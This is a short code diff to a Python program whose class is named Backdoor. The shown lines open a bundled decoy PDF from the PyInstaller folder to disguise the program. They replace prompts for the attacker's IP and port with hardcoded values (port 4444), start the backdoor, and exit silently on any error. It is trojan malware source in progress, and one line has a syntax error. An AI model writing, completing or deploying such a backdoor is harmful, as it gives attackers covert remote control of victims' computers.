@@ -96,17 +96,18 @@ class Backdoor:
 file_name = sys._MEIPASS + "\sample.pdf" #sys._MEIPASS = default location used by pyinstaller
 subprocess.Popen(file_name), shell=True)
     
-ip = raw_input("Enter IP Address: ")
-port = int(raw_input("Enter port number to use: "))
-buffer_size = int(raw_input("Enter buffer size: "))
+#ip = raw_input("Enter IP Address: ")
+#port = int(raw_input("Enter port number to use: "))
+#buffer_size = int(raw_input("Enter buffer size: "))
+ip = " "
+port = 4444
+buffer_size = 1024
 
 try:
     my_backdoor = Backdoor(ip, port)
     my_backdoor.run()
 except Exception: #Exception = any type of error that occurs when trying to run program
-    sys.exit() #exit quietly
-    
-
+    sys.exit() #exit quietly    
 
 
 
